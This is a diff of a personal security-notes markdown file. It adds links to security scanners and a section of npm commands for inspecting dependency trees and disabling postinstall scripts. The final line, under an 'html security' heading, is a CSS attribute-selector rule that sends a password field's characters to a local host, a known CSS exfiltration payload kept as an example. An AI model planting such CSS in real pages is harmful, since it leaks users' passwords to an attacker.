@@ -18,7 +18,35 @@
  * https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools
  * artifactory https://jfrog.com/security-and-compliance/
  * https://www.sonarqube.org/features/security/
+ * [snyk npm advisor](https://snyk.io/advisor/search)
 
+## npm security
+
+* https://stackoverflow.com/questions/23505318/npm-disable-postinstall-script-for-package
+```bash
+	npm list --depth=[depth] package
+	npm list --prod --all
+
+	npm install npm-remote-ls
+	npx npm-remote-ls --flatten dugite -d false -o false
+
+	npm view mongoose dependencies
+
+	DISABLE_POSTINSTALL is to disable the npm hook postinstall
+	npm install --ignore-scripts
+	npm config set ignore-scripts true
+	#npm8
+	npm pkg set scripts.postinstall="echo no-postinstall"
+	#npm7
+	npm set-script postinstall ""
+	#Define .npmrc and set ignore-scripts=true
+```
+
+* [npm dependency tree](npm.anvaka.com/)
+* https://github.com/megahertz/howfat
+* `yarn why <MODULE>`
+
+## html security
 
 ```css
 input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
